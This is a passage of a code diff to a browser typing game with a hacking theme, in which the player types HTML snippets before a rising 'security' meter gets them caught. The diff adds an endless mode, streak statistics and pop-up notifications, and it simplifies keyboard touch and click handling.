+        previewBoxEl.innerHTML = escapeHtml(typed);
     }
 
     function escapeHtml(text) {
@@ -808,14 +858,22 @@
 
     function levelComplete() {
         playSound('success');
-        score += 100 * (currentLevel + 1);
-        security = Math.max(0, security - 15);
-        currentLevel++;
+        codesTyped++;
+        streak++;
+        if (streak > maxStreak) maxStreak = streak;
+        
+        let points = isEndlessMode ? 50 : 100 * (currentLevelIndex + 1);
+        score += points;
+        security = Math.max(0, security - 20);
+        
+        showNotification(`✅ ${isEndlessMode ? 'Challenge' : 'Level ' + (currentLevelIndex + 1)} Complete! +${points} XP`);
+        
+        if (!isEndlessMode) currentLevelIndex++;
+        
+        updateStats();
         updateSecurity();
         
-        setTimeout(() => {
-            loadLevel();
-        }, 350);
+        setTimeout(() => { loadLevel(); }, 600);
     }
 
     function startSecurityDecay() {
@@ -823,21 +881,37 @@
         securityDecayInterval = setInterval(() => {
             if (!isPlaying) return;
             if (security > 0) {
-                security = Math.max(0, security - 1.5);
+                security = Math.max(0, security - 2);
                 updateSecurity();
             }
-        }, 800);
+        }, 1000);
     }
 
     function updateSecurity() {
         securityBar.style.width = security + '%';
-        securityText.innerText = Math.round(security) + '%';
-        
-        if (security > 70) {
-            securityBar.classList.add('critical');
-        } else {
-            securityBar.classList.remove('critical');
-        }
+        securityText.innerText = security + '%';
+        if (security > 70) securityBar.classList.add('critical');
+        else securityBar.classList.remove('critical');
+    }
+
+    function updateStats() {
+        document.getElementById('codesTyped').innerText = codesTyped;
+        document.getElementById('totalLevels').innerText = hackingLevels.length;
+        document.getElementById('streak').innerText = streak;
+        document.getElementById('maxStreak').innerText = maxStreak;
+    }
+
+    function showNotification(message) {
+        const notif = document.createElement('div');
+        notif.className = 'notification';
+        notif.innerText = message;
+        document.body.appendChild(notif);
+        setTimeout(() => {
+            notif.style.opacity = '0';
+            notif.style.transform = 'translate(-50%, -20px)';
+            notif.style.transition = 'all 0.5s ease';
+            setTimeout(() => notif.remove(), 500);
+        }, 2000);
     }
 
     function gameOver() {
@@ -848,50 +922,33 @@
         endTitle.innerText = 'CAUGHT!';
         endTitle.className = 'caught';
         endMessage.innerText = 'The Admin Cat saw your syntax error.';
-        endLevel.innerText = currentLevel + 1;
+        endLevel.innerText = isEndlessMode ? '∞' : (currentLevelIndex + 1);
         endScore.innerText = score;
+        endStreak.innerText = maxStreak;
         
         gameOverScreen.classList.remove('hidden');
     }
 
-    function gameVictory() {
-        isPlaying = false;
-        clearInterval(securityDecayInterval);
-        playSound('success');
-
-        endTitle.innerText = 'MAINFRAME OVERRIDDEN!';
-        endTitle.className = 'success';
-        endMessage.innerText = 'Congratulations! You mastered 30 HTML basics in stealth mode.';
-        endLevel.innerText = '30';
-        endScore.innerText = score;
-
-        gameOverScreen.classList.remove('hidden');
-    }
-
-    /* DEBOUNCED TOUCH & CLICK EVENT DELEGATION */
     const keyboardEl = document.getElementById('keyboard');
-    let lastKeyTouchTime = 0;
 
-    function handleKeyInput(e) {
-        const now = Date.now();
-        
-        // Prevent ghost click firing right after touchstart
-        if (e.type === 'touchstart') {
-            lastKeyTouchTime = now;
-        } else if (e.type === 'click' && (now - lastKeyTouchTime < 400)) {
-            return;
-        }
-
+    function handleKeyInteraction(e) {
         const keyEl = e.target.closest('.key');
-        if (keyEl) {
-            if (e.cancelable && e.type === 'touchstart') e.preventDefault();
-            const keyValue = keyEl.getAttribute('data-key');
-            if (keyValue !== null) pressKey(keyValue);
-        }
+        if (!keyEl) return;
+        e.preventDefault();
+        const keyValue = keyEl.getAttribute('data-key');
+        if (keyValue !== null) pressKey(keyValue);
     }
 
-    keyboardEl.addEventListener('touchstart', handleKeyInput, { passive: false });
-    keyboardEl.addEventListener('click', handleKeyInput);
+    keyboardEl.addEventListener('touchstart', handleKeyInteraction, { passive: false });
+    keyboardEl.addEventListener('click', (e) => {
+        if (e.pointerType === 'mouse' || !e.pointerType) {
+            const keyEl = e.target.closest('.key');
+            if (keyEl) {
+                const keyValue = keyEl.getAttribute('data-key');
+                if (keyValue !== null) pressKey(keyValue);
+            }
+        }
+    });
 </script>
 </body>
 </html>
